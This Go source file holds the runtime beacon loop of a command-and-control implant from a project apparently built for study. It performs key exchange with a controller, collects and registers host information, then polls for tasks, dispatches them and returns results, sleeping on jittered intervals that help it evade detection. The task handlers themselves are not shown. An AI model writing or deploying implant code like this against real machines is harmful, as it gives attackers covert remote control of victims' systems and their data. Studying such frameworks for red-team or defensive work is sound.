package runtime

import (
	"context"
	"errors"
	"log"
	"math/rand/v2"
	"time"

	"xhc2_for_studying/implant/client"
	"xhc2_for_studying/implant/config"
	"xhc2_for_studying/implant/identity"
	implantTask "xhc2_for_studying/implant/task"
	"xhc2_for_studying/protocol"
)

type Runner struct {
	cfg    *config.BeaconConfig
	client *client.Client
}

func NewRunner(cfg *config.BeaconConfig, client *client.Client) (*Runner, error) {
	if cfg == nil {
		return nil, errors.New("beacon config is nil")
	}
	if client == nil {
		return nil, errors.New("client is nil")
	}
	if cfg.Interval <= 0 {
		return nil, errors.New("interval must be greater than zero")
	}
	return &Runner{cfg: cfg, client: client}, nil
}

func (r *Runner) Run(ctx context.Context) error {
	if r == nil {
		return errors.New("runner is nil")
	}

	// ── Step 0: 密钥交换（握手）──
	log.Println("[*] starting key exchange...")
	if err := r.client.KeyExchange(); err != nil {
		return err
	}
	log.Println("[+] key exchange done, session established")

	// ── Step 1: 注册 ──
	hostInfo, err := identity.CollectHostInfo()
	if err != nil {
		return err
	}

	beaconID, err := r.client.Register(hostInfo, r.cfg)
	if err != nil {
		return err
	}
	log.Printf("[+] registered as %s\n", beaconID)

	// ── Step 2: 主循环 ──
	var pendingResult *protocol.TaskResult
	for {
		checkinResp, err := r.client.CheckIn(beaconID, pendingResult)
		if err != nil {
			return err
		}
		pendingResult = nil

		if len(checkinResp.Tasks) > 0 {
			pendingResult = implantTask.Dispatch(checkinResp.Tasks[0], beaconID)
		}

		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(jitteredSleep(r.cfg.Interval, r.cfg.Jitter)):
		}
	}
}

func jitteredSleep(interval, jitter int64) time.Duration {
	sleep := interval
	if jitter > 0 {
		sleep += rand.Int64N(jitter*2+1) - jitter
	}
	if sleep < 1 {
		sleep = 1
	}
	return time.Duration(sleep) * time.Second
}
